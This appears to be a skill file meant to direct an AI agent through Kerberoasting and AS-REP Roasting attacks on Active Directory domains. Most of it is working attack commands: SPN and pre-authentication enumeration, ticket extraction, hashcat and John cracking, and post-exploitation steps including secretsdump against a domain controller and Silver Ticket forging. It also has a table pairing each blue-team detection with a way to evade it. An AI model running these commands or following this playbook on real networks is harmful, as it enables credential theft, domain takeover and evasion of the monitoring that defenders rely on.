---
name: kerberoast-attack
description: "Complete Kerberoasting and AS-REP Roasting attack methodology. Use when you hold any domain user credentials (Kerberoasting) or discover accounts without pre-authentication (AS-REP Roasting). Covers SPN discovery, ticket requests, offline cracking, and AES vs RC4 strategy selection"
zh-signals: "Kerberoasting 与 AS-REP Roasting 域内票据攻击与离线破解方法。信号:Kerberoasting,AS-REP,Kerberos,域攻击,离线破解"
when-to-use: "Use when you hold any domain user credentials or find accounts without pre-authentication and need to extract and crack service tickets."
metadata:
  tags: "kerberoast,asrep,kerberos,spn,tgs,hashcat,domain-attack,ticket,service-account,offline-cracking"
  category: "lateral"
  mitre_attack: "T1558.003,T1558.004"
---

# Kerberoasting & AS-REP Roasting

> **Core Value**: Obtain high-privilege service account passwords with any domain user privilege → reach domain admin level without privilege escalation

## ⛔ Further Reading

- Hashcat cracking modes and wordlist strategies → [references/hash-cracking.md](references/hash-cracking.md)
- GPU benchmarks for multiple hash types and advanced cracking engineering → [references/hash-cracking-guide.md](references/hash-cracking-guide.md)
- Defense evasion and advanced exploitation → [references/advanced-kerberoast.md](references/advanced-kerberoast.md)

---

## Part A: Kerberoasting (requires any domain user credentials)

### Phase 1: SPN Enumeration

```bash
# impacket — most recommended
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request

# netexec
netexec ldap DC_IP -u user -p pass --kerberoasting output.txt

# Pure LDAP query
ldapsearch -H ldap://DC_IP -D "user@domain" -w "pass" \
  -b "DC=domain,DC=com" "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName memberOf

# PowerShell (on a machine already in the domain)
setspn -T domain -Q */*
# or
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### Phase 2: Ticket Request Strategy

```
Encryption type selection:
├─ RC4 (etype 23) → hashcat mode 13100 → fast cracking ⭐
├─ AES256 (etype 18) → hashcat mode 19700 → 10x slower cracking
└─ AES128 (etype 17) → hashcat mode 19600 → moderate

Strategy:
├─ impacket requests RC4 by default → fastest cracking
├─ If the target enforces AES → slow cracking is the only option
├─ ⛔ The domain controller may monitor RC4 TGS requests → OPSEC risk!
└─ AES requests are stealthier (normal behavior) but crack slower
```

**OPSEC considerations:**
```
# Stealthy approach: request AES-encrypted tickets (looks more normal)
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request -outputfile hashes.txt

# Ultra-stealthy: only request specific high-value SPNs (do not enumerate all)
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP \
  -request -target-user svc_sql_admin

# ⛔ Avoid: requesting tickets for all SPNs at once → alerts
```

### Phase 3: Offline Cracking

```bash
# Hashcat — GPU cracking
hashcat -m 13100 hashes.txt wordlist.txt           # RC4
hashcat -m 19700 hashes.txt wordlist.txt           # AES256
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule  # rules

# John the Ripper
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt

# Wordlist selection priority
├─ 1. Target-specific wordlists (company name + year + special characters)
├─ 2. rockyou.txt + rules
├─ 3. Leaked password collections
└─ 4. Combination attacks (company name + common patterns)
```

### Phase 4: High-Value Target Identification

```
Not every SPN account is worth cracking, priority:
High value (crack first):
├─ The account is a member of Domain Admins / Enterprise Admins
├─ The account name contains "admin" / "svc" / "sql" / "backup"
├─ The account has the AdminCount=1 attribute
├─ The account appears on BloodHound attack paths
└─ The account has a lax password policy (no enforced complexity)

Identification method:
ldapsearch ... "(&(servicePrincipalName=*)(adminCount=1))" sAMAccountName
```

---

## Part B: AS-REP Roasting (no credentials required / user list needed)

### Phase 1: Discover Accounts Without Pre-authentication

```bash
# No credentials — enumerate accounts without pre-authentication
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt \
  -format hashcat -outputfile asrep_hashes.txt

# With credentials — query all accounts without pre-authentication
impacket-GetNPUsers DOMAIN/user:pass -dc-ip DC_IP -request

# LDAP query
ldapsearch -H ldap://DC_IP -D "user@domain" -w "pass" \
  -b "DC=domain,DC=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# netexec
netexec ldap DC_IP -u user -p pass --asreproast asrep.txt
```

### Phase 2: Crack AS-REP Hashes

```bash
# hashcat mode 18200
hashcat -m 18200 asrep_hashes.txt wordlist.txt -r rules/best64.rule

# john
john --format=krb5asrep asrep_hashes.txt --wordlist=wordlist.txt
```

---

## Part C: Post-Exploitation — After a Successful Crack

```
Once you have a service account password:
├─ Use the credentials for lateral movement
│   netexec smb TARGETS -u svc_account -p 'cracked_pass'
├─ If it is a DA / high-privilege account
│   impacket-secretsdump DOMAIN/svc_admin:pass@DC_IP
├─ Request a Silver Ticket (no DC verification)
│   impacket-ticketer -nthash HASH -domain-sid S-1-5-... -domain DOMAIN -spn ...
└─ Add an SPN to a compromised account → targeted Kerberoasting
    setspn -a http/fake svc_account  # let others Kerberoast you
```

## Detection and Evasion Matrix

| Blue Team Detection | Red Team Countermeasure |
|----------|---------|
| Mass TGS requests (EventID 4769) | Only request high-value targets, do not enumerate everything |
| RC4 downgrade detection | Request AES256 tickets (slower cracking but stealthier) |
| Honeypot SPN accounts | Compare against BloodHound data and exclude anomalous SPNs |
| Anomalous timing of requests | Perform the operations during business hours |
| Large number of tickets for a specific account | Spread the request timing |

## Tool Quick Reference

| Tool | Purpose |
|------|------|
| impacket-GetUserSPNs | Kerberoasting ticket requests |
| impacket-GetNPUsers | AS-REP Roasting |
| netexec | Integrated enumeration and attack |
| Rubeus | Windows-side Kerberoasting (including OPSEC options) |
| hashcat | GPU offline cracking |
| BloodHound | Identify high-value SPN accounts |
